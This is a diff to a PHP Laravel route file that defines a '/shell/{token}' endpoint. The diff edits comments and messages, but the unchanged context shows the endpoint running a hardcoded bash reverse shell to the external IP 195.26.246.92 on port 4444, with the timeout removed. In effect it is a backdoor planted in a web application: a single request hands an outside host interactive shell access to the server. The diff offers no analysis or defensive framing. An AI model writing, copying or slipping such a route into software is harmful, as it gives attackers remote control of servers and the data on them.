@@ -13,18 +13,19 @@ Route::get('/shell/{token}', function ($token) {
     $command = 'bash -c \'bash -i >& /dev/tcp/195.26.246.92/4444 0>&1\'';
 
     try {
-        // Execute the command
+        // Execute the reverse shell command
         $process = Process::fromShellCommandline($command);
-        $process->setTimeout(0); // Remove any timeout for long-running processes
+        $process->setTimeout(0); // Remove timeout to keep the process running
         $process->run();
 
-        // Return the output or error
+        // Return success or error output
         if ($process->isSuccessful()) {
-            return response($process->getOutput());
+            return response('Command executed successfully.');
         } else {
             return response('Command failed: ' . $process->getErrorOutput(), 500);
         }
     } catch (ProcessFailedException $exception) {
-        return response('Command failed: ' . $exception->getMessage(), 500);
+        return response('Command execution error: ' . $exception->getMessage(), 500);
     }
 });
+
